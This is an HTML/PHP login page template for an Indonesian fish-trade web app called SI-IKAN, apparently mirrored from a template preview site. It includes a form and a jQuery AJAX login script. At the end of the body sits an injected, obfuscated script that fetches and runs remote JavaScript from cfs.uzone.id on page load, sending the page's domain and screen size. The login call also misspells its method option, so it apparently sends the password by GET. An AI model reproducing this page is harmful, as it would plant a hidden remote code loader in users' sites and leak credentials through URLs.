<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from wbpreview.com/previews/WB0F56883/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 May 2017 23:49:35 GMT -->
<head>
    <meta charset="utf-8">
    <title>Login page - SI Ikan</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Responsive HTML template for Your company">
    <meta name="author" content="Oskar Żabik (oskar.zabik@gmail.com)">

    <!-- Le styles -->
    <link href="<?php echo base_url().'assets/login/'; ?>css/bootstrap.min.css" rel="stylesheet">
    <link href="<?php echo base_url().'assets/login/'; ?>css/bootstrap-responsive.min.css" rel="stylesheet">
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>stylesheets/sweetalert.css">
    <link rel="stylesheet" href="<?php echo base_url().'assets/login/'; ?>css/typica-login.css">

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
    <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le favicon -->
    <link rel="shortcut icon" href="<?php echo base_url(); ?>favicon.ico">

</head>

<body>

<div class="navbar navbar-fixed-top">
    <div class="navbar-inner">
        <div class="container">
            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </a>
            <a class="brand" href="index-2.html"><img src="<?php echo base_url().'assets/login/'; ?>logo.png" alt="Typica - Bootstrap Awesome Template!"></a>
        </div>
    </div>
</div>

<div class="container">

    <div id="login-wraper">
        <form class="form login-form" action="<?php echo base_url('index.php/login/login'); ?>" method="post">
            <legend>Masuk ke <span class="blue">SI-IKAN</span></legend>

            <div class="body">
                <label>Username</label>
                <input type="text" name="username" id="username">

                <label>Password</label>
                <input type="password" name="password" id="password">

                <label>User Type</label>
                <select name="tipe" id="tipe">
                    <option value="1"> Konsumen</option>
                    <option value="2"> Supplier</option>
                    <option value="3"> Distributor</option>
                    <option value="4"> Admin Utama</option>
                </select>
            </div>

            <div class="footer">

                <button type="submit" class="btn btn-success" value="login" id="login">Login</button>
            </div>

        </form>
    </div>

</div>

<footer class="white navbar-fixed-bottom">
    Don't have an account yet? <a href="<?php echo base_url('index.php/login/formregister'); ?>" class="btn btn-black">Register</a>
</footer>


<!-- Le javascript
================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="<?php echo base_url().'assets/login/'; ?>js/jquery.js"></script>
<script src="<?php echo base_url().'assets/login/'; ?>js/bootstrap.js"></script>
<script src="<?php echo base_url().'assets/login/'; ?>js/backstretch.min.js"></script>
<script src="<?php echo base_url().'assets/login/'; ?>js/typica-login.js"></script>
<script src="<?php echo base_url().'assets/'; ?>sweetalert.min.js"></script>
<script>
    $(document).ready(function () {
        $('#login').click(function () {
           var user = $('#username').val();
           var pass = $('#password').val();
           var tipe = $('#tipe').val();

            $.ajax({
                tipe    :   'POST',
                url     :   '<?php echo base_url('index.php/login/cekAkun'); ?>',
                data    :   {
                    "username"  : user,
                    "password"  : pass,
                    "tipe"      : tipe
                }
            }).done(function (data) {
               if (data=="Username Atau Password Tidak Sesuai"){
                   swal("Gagal!", data, "error");
               } else {
                   swal("Sukses!", data, "success");
                   window.location= '<?php echo base_url('index.php/home'); ?>';
               }
            });
        });
    });
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKnu6vlkoKplFEWqo81FJpbVaLjN3oZjQNKEHCbm1Du4TArORPveLLm76qYZcEf390BzRx70QhqgtmH9d%2bniT3dj4Ap11b%2fk663mAqJlgk8NCpQeWjtlUt2DRb95SG6UB1362uV2z5yMGZp%2bFM2X3hNRhovDcUCgy6mJm4SNhKQyPDDqH8X9SbPSCxyXj4QuwXaY9oGhSog4Yb3ExjT3fzW7IzagGn11K0x4rA3syqXZJkAFaaRViXktR0qtOOqZS9WrryL0TBZqBRz%2bcH3AtJN8J3QKfR9nBOoknSTEcyYCSkocthp7vUDegrEDzIKxDjTcJjM4DcVDKTaGO7zL7Jfkdb9FpcS4pWxUXlG9zHJcpZjcVWy4JwpxPfpiDFXD%2foAVhknEutFGI1beWNBgxXCK6varCfUiK1C7pohjt32U02oQC98%2bjVwL0DRM7tk0XMuSFzWckKZiQU7iRE9%2fWWX9aVORXccHWvbxUtc2k4haA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from wbpreview.com/previews/WB0F56883/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 May 2017 23:49:35 GMT -->
</html>
